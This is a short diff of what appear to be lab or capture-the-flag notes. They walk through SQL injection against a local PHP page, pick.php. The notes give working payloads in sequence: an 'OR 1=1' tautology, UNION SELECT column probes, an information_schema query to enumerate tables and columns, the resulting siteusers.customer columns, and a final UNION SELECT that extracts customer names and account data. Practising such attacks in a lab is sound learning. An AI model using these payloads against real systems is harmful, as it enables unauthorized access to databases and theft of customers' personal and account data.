@@ -101,4 +101,14 @@ for all of them
 http://localhost:11900/pick.php?product=7%20OR%201=1;%20#
 THEN
 product=7 UNION SELECT 1,2,3;#
-Uproduct=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns; #
+                                  column = 1,3,2
+PULLING DATA FROM DATABASE
+
+siteusers  |   customer  |  account
+siteusers  |   customer  |  name
+
+
+product=7 UNION SELECT name,description,account FROM siteusers.customer;
+
+
